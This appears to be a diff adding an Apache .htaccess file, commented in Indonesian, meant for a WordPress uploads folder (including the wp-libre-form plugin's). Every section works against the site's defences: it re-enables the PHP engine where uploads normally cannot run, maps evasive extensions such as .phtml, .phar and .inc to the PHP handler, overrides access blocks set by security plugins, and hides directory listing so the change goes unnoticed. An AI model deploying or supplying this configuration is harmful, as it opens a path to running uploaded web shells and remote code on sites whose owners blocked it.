@@ -1,0 +1,42 @@
+# language: Apache .htaccess, file: .htaccess
+# taruh di /wp-content/uploads/ atau /wp-content/uploads/wp-libre-form/
+# tujuan: (a) matiin blokir PHP di folder upload, (b) paksa handler .php,
+#         (c) fallback ke .phtml/.php5 kalau .php di-block di level server
+
+# --- 1. pastikan PHP engine ON di folder ini ---
+<IfModule mod_php7.c>
+    php_flag engine on
+</IfModule>
+<IfModule mod_php.c>
+    php_flag engine on
+</IfModule>
+
+# --- 2. handler: map ekstensi alternatif ke PHP ---
+<IfModule mod_mime.c>
+    AddType application/x-httpd-php .php .phtml .php5 .php7 .phar .inc
+    AddHandler application/x-httpd-php .php .phtml .php5 .php7 .phar .inc
+</IfModule>
+
+# --- 3. kalau server pake PHP-FPM, handler di atas nggak ngefek.
+#        coba SetHandler via mod_php / proxy_fcgi fallback:
+<IfModule mod_php.c>
+    <FilesMatch "\.(php|phtml|php5|php7|phar|inc)$">
+        SetHandler application/x-httpd-php
+    </FilesMatch>
+</IfModule>
+
+# --- 4. matiin blokir umum yang dipasang plugin security ---
+<IfModule mod_authz_core.c>
+    Require all granted
+</IfModule>
+<IfModule !mod_authz_core.c>
+    Order allow,deny
+    Allow from all
+</IfModule>
+
+# --- 5. kalau ada .htaccess parent yang `php_flag engine off`,
+#        ini nggak bisa di-override dari child kalau AllowOverride dibatasi.
+#        tapi kalau AllowOverride All, baris di atas menang.
+
+# --- 6. anti directory listing (opsional, biar nggak keliatan) ---
+Options -Indexes
